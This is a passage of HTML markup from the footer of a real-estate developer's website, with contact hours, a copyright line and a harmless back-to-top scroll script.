                              height="20"
                              viewBox="0 0 24 24"
                            >
                              <g
                                fill="none"
                                stroke="currentColor"
                                stroke-linecap="round"
                                stroke-linejoin="round"
                                stroke-width="2"
                              >
                                <path d="M12 6v6l4 2"></path>
                                <circle cx="12" cy="12" r="10"></circle>
                              </g>
                            </svg>
                          </div>
                          <div class="footer-contact-text">
                            <span class="footer-contact-hours">
                              Monday - Friday
                            </span>
                            <span class="footer-contact-time">
                              9 AM - 6 PM EST
                            </span>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div class="footer-bottom">
                <div class="footer-container">
                  <div class="footer-bottom-content">
                    <p class="footer-copyright">
                      © 2025 Realtors Housing Developers. All rights reserved.
                    </p>
                    <button
                      id="backToTop"
                      aria-label="Back to top"
                      class="footer-back-top"
                    >
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="20"
                        height="20"
                        viewBox="0 0 24 24"
                      >
                        <path
                          fill="none"
                          stroke="currentColor"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          stroke-width="2"
                          d="m5 12l7-7l7 7m-7 7V5"
                        ></path>
                      </svg>
                      <span>Back to Top</span>
                    </button>
                  </div>
                </div>
              </div>
            </footer>
            <div class="footer-container2">
              <div class="footer-container3">
                <script defer="" data-name="footer-back-to-top">
                  document.addEventListener('DOMContentLoaded', function() {
                    (function(){
                    const backToTopButton = document.getElementById('backToTop');

                    if (backToTopButton) {
                      backToTopButton.addEventListener('click', () => {
                        window.scrollTo({
                          top: 0,
                          behavior: 'smooth'
                        });
                      });
                    }
                    })()
                  });
                </script>
              </div>
            </div>
          </div>
        </footer-wrapper>
      </div>
      <link
        rel="canonical"
        href="https://scary-ambitious-opossum-hhl69a.teleporthq.app/"
      />
    </div>
  </body>
</html>
